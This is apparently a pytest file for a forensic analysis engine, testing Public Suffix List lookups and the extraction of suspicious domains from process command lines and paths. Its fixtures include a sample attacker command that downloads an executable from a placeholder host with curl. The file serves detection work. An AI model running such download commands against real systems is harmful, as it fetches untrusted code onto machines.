"""Public Suffix List hostname validation and context-aware domain extraction."""

from __future__ import annotations

from memscope_engine.analysis.domain_extract import extract_domains, extract_network_host
from memscope_engine.analysis.public_suffix import PublicSuffixList, default_public_suffix_list


MINI_PSL = """
// ===BEGIN ICANN DOMAINS===
com
net
org
uk
co.uk
xyz
app
js
zip
local
ck
*.ck
!www.ck
// ===END ICANN DOMAINS===
"""


def test_psl_registrable_and_unknown_tlds() -> None:
    psl = PublicSuffixList(MINI_PSL)
    assert psl.registrable_domain("evil.example.com") == "example.com"
    assert psl.registrable_domain("cdn.malicious.xyz") == "malicious.xyz"
    assert psl.registrable_domain("payload.attacker.app") == "attacker.app"
    assert psl.registrable_domain("user.github.io") is None  # github.io not in mini list
    assert psl.registrable_domain("notatld.zzzzz") is None
    assert psl.registrable_domain("com") is None
    assert psl.public_suffix("www.ck") == "ck"
    assert psl.registrable_domain("www.ck") == "www.ck"
    assert psl.public_suffix("foo.ck") == "foo.ck"
    assert psl.registrable_domain("bar.foo.ck") == "bar.foo.ck"


def test_shipped_psl_covers_new_gilds_and_compound_suffixes() -> None:
    psl = default_public_suffix_list()
    assert psl.registrable_domain("cdn.evil.xyz") == "evil.xyz"
    assert psl.registrable_domain("mail.company.co.uk") == "company.co.uk"
    assert psl.registrable_domain("pages.github.io") == "pages.github.io"
    assert psl.registrable_domain("notatld.zzzzz") is None


def test_extract_domains_prefers_network_and_urls() -> None:
    psl = PublicSuffixList(MINI_PSL)
    cmdline = "curl http://payload.evil.xyz/a.exe && ping cdn.attacker.app"
    hosts = extract_domains(cmdline, source="processes.command_line", psl=psl)
    assert "payload.evil.xyz" in hosts
    assert "cdn.attacker.app" in hosts


def test_extract_domains_skips_path_fileish_and_microsoft() -> None:
    psl = PublicSuffixList(MINI_PSL)
    path = r"C:\tools\jquery.js and C:\Windows\System32\drivers"
    assert extract_domains(path, source="processes.image_path", psl=psl) == []
    cmdline = r"wscript payload.js"
    assert extract_domains(cmdline, source="processes.command_line", psl=psl) == []
    assert extract_domains("https://www.microsoft.com/en-us/", source="processes.command_line", psl=psl) == []


def test_extract_domains_accepts_unc_host() -> None:
    psl = PublicSuffixList(MINI_PSL)
    hosts = extract_domains(r"\\files.evil.xyz\share\tool.exe", source="processes.command_line", psl=psl)
    assert "files.evil.xyz" in hosts


def test_network_host_high_confidence() -> None:
    psl = PublicSuffixList(MINI_PSL)
    assert extract_network_host("cdn.evil.xyz", psl=psl) == "cdn.evil.xyz"
    assert extract_domains("203.0.113.10", source="network_connections", psl=psl) == []
